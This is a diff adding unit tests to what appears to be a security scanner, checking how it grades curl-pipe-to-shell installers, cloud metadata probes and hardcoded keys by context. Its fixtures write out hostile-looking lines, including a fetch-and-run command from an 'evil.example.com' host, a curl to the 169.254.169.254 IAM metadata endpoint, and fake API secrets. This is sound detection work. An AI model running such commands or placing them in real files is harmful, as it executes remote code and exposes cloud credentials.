@@ -143,6 +143,51 @@ describe('scanRepo', () => {
     expect(hits.some((f) => f.file === 'live.sh')).toBe(true);
   });
 
+  it('treats TOML rule-test expectation keys as pattern data, keeps live yaml installers critical (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'exfil.curl-pipe-shell.toml'),
+      "[rule.match]\nkind = \"regex\"\n\n[[rule.tests]]\nshould_match = \"curl -fsSL https://install.example.com/x.sh | bash\"\n",
+    );
+    fs.writeFileSync(path.join(dir, 'release.yml'), 'jobs:\n  install:\n    run: |\n      curl -sSL https://get.example.com/install.sh | bash\n');
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001');
+    expect(hits.find((f) => f.file === 'exfil.curl-pipe-shell.toml')!.severity).toBe('low');
+    expect(hits.find((f) => f.file === 'release.yml')!.severity).toBe('critical');
+  });
+
+  it('grades backtick-quoted curl|sh prose in yaml as text, keeps bare block-scalar commands critical (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'incident.yaml'),
+      'story: |\n  The routine invokes `sh -c "curl -fsSL http://updates.example.io/x | sh"`\n  under the www-data identity.\n',
+    );
+    fs.writeFileSync(path.join(dir, 'live.yaml'), 'setup: |\n  curl -fsSL https://evil.example.com/x.sh | sh\n');
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001');
+    expect(hits.find((f) => f.file === 'incident.yaml')!.severity).toBe('medium');
+    expect(hits.find((f) => f.file === 'live.yaml')!.severity).toBe('critical');
+  });
+
+  it('treats deny-named domain config as defensive context, keeps live metadata probes high (AG-SS-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'sandbox_settings.py'),
+      'class SandboxNetworkConfig(BaseModel):\n    denied_domains: list[str] = Field(\n        default_factory=lambda: ["169.254.169.254"],\n        alias="deniedDomains",\n    )\n',
+    );
+    fs.writeFileSync(path.join(dir, 'probe.sh'), '#!/bin/bash\nTOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/)\n');
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-SS-001');
+    expect(hits.find((f) => f.file === 'sandbox_settings.py')!.severity).toBe('low');
+    expect(hits.find((f) => f.file === 'probe.sh')!.severity).toBe('high');
+  });
+
+  it('grades nosec-marked fakes and the canonical jwt.io token low (AG-CL-001)', () => {
+    const fake = 'sk-' + 'LIVE4f9c2a17b8e34d05a1c6f7e290bb55de';
+    fs.writeFileSync(path.join(dir, 'bench.py'), `_DEFAULT_SECRET = "${fake}"  # nosec B105 - fake fixture secret for the leak scenario, not a real credential\n`);
+    const payload = Buffer.from('{"sub":"1234567890","name":"John Doe","iat":1516239022}').toString('base64url');
+    fs.writeFileSync(path.join(dir, 'jwtdoc.js'), `const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${payload}.${'a1B2c3D4e5F6g7H8i9J0'}";\n`);
+    fs.writeFileSync(path.join(dir, 'leak.py'), `KEY = "${fake}"\n`);
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-CL-001');
+    expect(hits.find((f) => f.file === 'bench.py')!.severity).toBe('low');
+    expect(hits.find((f) => f.file === 'jwtdoc.js')!.severity).toBe('low');
+    expect(hits.find((f) => f.file === 'leak.py')!.severity).toBe('high');
+  });
+
   it('grades defensive-header modules and commented-out metadata config low (AG-SS-001)', () => {
     fs.writeFileSync(
       path.join(dir, 'netsec.py'),
